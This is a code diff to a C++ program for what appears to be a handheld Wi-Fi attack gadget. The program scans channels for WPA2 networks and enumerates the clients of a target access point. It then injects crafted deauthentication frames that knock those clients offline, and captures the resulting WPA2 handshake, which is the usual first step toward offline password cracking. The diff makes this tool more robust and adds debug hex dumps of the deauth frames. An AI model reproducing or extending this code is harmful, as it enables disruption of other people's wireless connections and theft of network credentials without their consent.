@@ -37,52 +37,91 @@ bool is_network_duplicate(const std::vector<WiFiNetwork>& networks, const WiFiNe
     return false;
 }
 
-void scan_for_networks(WiFiController& wifi, std::vector<WiFiNetwork>& networks, 
-                       OLEDDisplay& oled, LEDController& leds) {
+bool scan_for_networks(WiFiController& wifi, std::vector<WiFiNetwork>& networks,
+                       OLEDDisplay& oled, LEDController& leds, ButtonController& buttons) {
     std::cout << "\n[STATE] Starting beacon scan..." << std::endl;
-    
+
     networks.clear();
     leds.set_blink(LEDController::YELLOW, 500);
     oled.show_scanning(0);
-    
+
+    int total_packets = 0;
+    int beacon_packets = 0;
+
     for (int ch_idx = 0; ch_idx < CHANNEL_COUNT; ch_idx++) {
         int channel = SCAN_CHANNELS[ch_idx];
-        wifi.set_channel(channel);
+
+        // Check if channel switch succeeded
+        if (!wifi.set_channel(channel)) {
+            std::cerr << "[ERROR] Failed to switch to channel " << channel << ", skipping..." << std::endl;
+            continue;
+        }
+
         std::cout << "[SCAN] Channel " << channel << "..." << std::endl;
-        
+
         // Capture for 500ms on this channel
         time_t start = time(NULL);
         time_t deadline = start + 1; // Actually ~500ms with processing time
-        
+        int channel_packets = 0;
+
         while (time(NULL) < deadline) {
+            // Check for double ESC to abort scan
+            auto btn = buttons.get_press();
+            if (btn == ButtonController::ESC && buttons.check_double_esc()) {
+                std::cout << "[INPUT] Double ESC - aborting scan" << std::endl;
+                return false; // Scan aborted
+            }
+
             struct pcap_pkthdr* header;
             const u_char* packet;
-            
+
             int res = pcap_next_ex(wifi.get_handle(), &header, &packet);
             if (res == 1) {
                 // Got a packet
-                if (PacketProcessor::is_beacon_frame(packet, header->len)) {
+                total_packets++;
+                channel_packets++;
+
+                // Strip radiotap header to get raw 802.11 frame
+                const uint8_t* frame = nullptr;
+                int frame_len = 0;
+
+                if (!normalize_80211_frame(wifi.get_handle(),
+                                          (const uint8_t*)packet,
+                                          header->len,
+                                          frame,
+                                          frame_len)) {
+                    continue;
+                }
+
+                if (PacketProcessor::is_beacon_frame(frame, frame_len)) {
+                    beacon_packets++;
                     WiFiNetwork net;
                     net.channel = channel;
                     net.last_seen = time(NULL);
-                    
-                    if (PacketProcessor::parse_beacon(packet, header->len, net)) {
+
+                    if (PacketProcessor::parse_beacon(frame, frame_len, net)) {
                         if (!is_network_duplicate(networks, net)) {
                             networks.push_back(net);
-                            std::cout << "[BEACON] Found WPA2 network: " 
-                                      << net.get_display_ssid() 
+                            std::cout << "[BEACON] Found WPA2 network: "
+                                      << net.get_display_ssid()
                                       << " [" << mac_to_string(net.bssid) << "] "
                                       << "on channel " << channel << std::endl;
                             oled.show_scanning(networks.size());
                         }
                     }
                 }
+            } else if (res == -1) {
+                std::cerr << "[ERROR] pcap_next_ex error: " << pcap_geterr(wifi.get_handle()) << std::endl;
             }
             usleep(10000); // 10ms
         }
+
+        std::cout << "[DEBUG] Channel " << channel << ": captured " << channel_packets << " packets" << std::endl;
     }
-    
+
     std::cout << "[SCAN] Complete. Found " << networks.size() << " WPA2 networks" << std::endl;
+    std::cout << "[DEBUG] Total packets: " << total_packets << ", Beacon frames: " << beacon_packets << std::endl;
+    return true; // Scan completed successfully
 }
 
 bool find_clients(WiFiController& wifi, const WiFiNetwork& target, 
@@ -101,10 +140,22 @@ bool find_clients(WiFiController& wifi, const WiFiNetwork& target,
         
         int res = pcap_next_ex(wifi.get_handle(), &header, &packet);
         if (res == 1) {
-            if (PacketProcessor::is_data_frame(packet, header->len)) {
+            // Strip radiotap header to get raw 802.11 frame
+            const uint8_t* frame = nullptr;
+            int frame_len = 0;
+
+            if (!normalize_80211_frame(wifi.get_handle(),
+                                      (const uint8_t*)packet,
+                                      header->len,
+                                      frame,
+                                      frame_len)) {
+                continue;
+            }
+
+            if (PacketProcessor::is_data_frame(frame, frame_len)) {
                 uint8_t ap_mac[6], client_mac[6];
-                PacketProcessor::extract_addresses(packet, header->len, ap_mac, client_mac);
-                
+                PacketProcessor::extract_addresses(frame, frame_len, ap_mac, client_mac);
+
                 // Check if this is for our target AP
                 if (compare_mac(ap_mac, target.bssid)) {
                     // Check if client already in list
@@ -117,7 +168,7 @@ bool find_clients(WiFiController& wifi, const WiFiNetwork& target,
                             break;
                         }
                     }
-                    
+
                     if (!found) {
                         ClientDevice client;
                         memcpy(client.mac, client_mac, 6);
@@ -151,17 +202,33 @@ bool capture_handshake(WiFiController& wifi, WiFiNetwork& target,
     // Send deauth packets if requested
     if (send_deauth && target_clients && !target_clients->empty()) {
         std::cout << "[INFO] Sending deauth packets..." << std::endl;
-        
+
         for (const auto& client : *target_clients) {
             auto deauth_frame = PacketProcessor::craft_deauth_frame(target.bssid, client.mac);
-            
+
+            std::cout << "[DEBUG] Deauth frame details:" << std::endl;
+            std::cout << "[DEBUG]   Frame size: " << deauth_frame.size() << " bytes" << std::endl;
+            std::cout << "[DEBUG]   Target AP (BSSID): " << mac_to_string(target.bssid) << std::endl;
+            std::cout << "[DEBUG]   Target Client: " << mac_to_string(client.mac) << std::endl;
+            std::cout << "[DEBUG]   Frame hex dump: ";
+            for (size_t i = 0; i < deauth_frame.size(); i++) {
+                printf("%02X ", deauth_frame[i]);
+            }
+            std::cout << std::endl;
+
             // Send multiple deauth frames
             for (int i = 0; i < 5; i++) {
-                pcap_inject(wifi.get_handle(), deauth_frame.data(), deauth_frame.size());
+                int sent = pcap_inject(wifi.get_handle(), deauth_frame.data(), deauth_frame.size());
+                std::cout << "[DEBUG] pcap_inject returned: " << sent << " bytes" << std::endl;
+                if (sent < 0) {
+                    std::cerr << "[ERROR] pcap_inject failed: " << pcap_geterr(wifi.get_handle()) << std::endl;
+                }
                 usleep(100000); // 100ms between packets
             }
-            std::cout << "[DEAUTH] Sent to " << mac_to_string(client.mac) << std::endl;
+            std::cout << "[DEAUTH] Sent 5 packets to " << mac_to_string(client.mac) << std::endl;
         }
+
+        std::cout << "[INFO] Deauth packets sent, waiting for handshake..." << std::endl;
     }
     
     // Wait for handshake (max 60 seconds)
@@ -181,18 +248,30 @@ bool capture_handshake(WiFiController& wifi, WiFiNetwork& target,
         
         int res = pcap_next_ex(wifi.get_handle(), &header, &packet);
         if (res == 1) {
-            if (PacketProcessor::is_eapol_frame(packet, header->len)) {
-                int msg_type = PacketProcessor::get_eapol_message_type(packet, header->len);
-                
+            // Strip radiotap header to get raw 802.11 frame
+            const uint8_t* frame = nullptr;
+            int frame_len = 0;
+
+            if (!normalize_80211_frame(wifi.get_handle(),
+                                      (const uint8_t*)packet,
+                                      header->len,
+                                      frame,
+                                      frame_len)) {
+                continue;
+            }
+
+            if (PacketProcessor::is_eapol_frame(frame, frame_len)) {
+                int msg_type = PacketProcessor::get_eapol_message_type(frame, frame_len);
+
                 if (msg_type == 1) {
                     std::cout << "[EAPOL] Captured Message 1" << std::endl;
-                    PacketProcessor::parse_eapol_msg1(packet, header->len, target);
+                    PacketProcessor::parse_eapol_msg1(frame, frame_len, target);
                     target.has_msg1 = true;
                 } else if (msg_type == 2) {
                     std::cout << "[EAPOL] Captured Message 2" << std::endl;
-                    target.has_msg2 = PacketProcessor::parse_eapol_msg2(packet, header->len, target);
+                    target.has_msg2 = PacketProcessor::parse_eapol_msg2(frame, frame_len, target);
                 }
-                
+
                 // Check if we have complete handshake
                 if (target.handshake_complete()) {
                     std::cout << "[SUCCESS] Complete handshake captured!" << std::endl;
@@ -241,9 +320,22 @@ int main() {
             leds.set_solid(LEDController::RED, true);
             return 1;
         }
-        
+
+        // Set initial channel before opening pcap
+        std::cout << "[INIT] Setting initial channel..." << std::endl;
+        if (!wifi.set_channel(1)) {
+            std::cerr << "[FATAL] Failed to set initial channel" << std::endl;
+            oled.show_message("ERROR", {"Channel switch", "failed"});
+            leds.set_solid(LEDController::RED, true);
+            return 1;
+        }
+
+        // Small delay to let channel switch settle
+        usleep(100000);
+
         // Open packet capture
-        if (!wifi.open_capture("type mgt subtype beacon or type data")) {
+        // More permissive filter - capture all management and data frames
+        if (!wifi.open_capture("")) {
             std::cerr << "[FATAL] Failed to open packet capture" << std::endl;
             oled.show_message("ERROR", {"Packet capture", "failed"});
             leds.set_solid(LEDController::RED, true);
@@ -289,13 +381,39 @@ int main() {
         
         while (true) {
             // Scan for networks
-            scan_for_networks(wifi, networks, oled, leds);
+            bool scan_completed = scan_for_networks(wifi, networks, oled, leds, buttons);
             last_scan_time = time(NULL);
-            
+
+            // Check if scan was aborted
+            if (!scan_completed) {
+                std::cout << "[INFO] Scan aborted by user" << std::endl;
+                leds.all_off();
+                oled.clear();
+                return 0;
+            }
+
             if (networks.empty()) {
                 std::cout << "[INFO] No WPA2 networks found" << std::endl;
-                oled.show_message("No Networks", {"No WPA2 found", "Rescanning..."});
-                sleep(3);
+                oled.show_message("No Networks", {"No WPA2 found", "SELECT=Rescan", "ESC ESC=Exit"});
+
+                // Wait for user input
+                bool waiting_input = true;
+                while (waiting_input) {
+                    auto btn = buttons.get_press();
+                    if (btn == ButtonController::SELECT) {
+                        // User wants to rescan
+                        std::cout << "[INPUT] User chose to rescan" << std::endl;
+                        waiting_input = false;
+                    } else if (btn == ButtonController::ESC) {
+                        if (buttons.check_double_esc()) {
+                            std::cout << "[INPUT] Double ESC - exiting program" << std::endl;
+                            leds.all_off();
+                            oled.clear();
+                            return 0;
+                        }
+                    }
+                    usleep(100000); // 100ms
+                }
                 continue;
             }
             
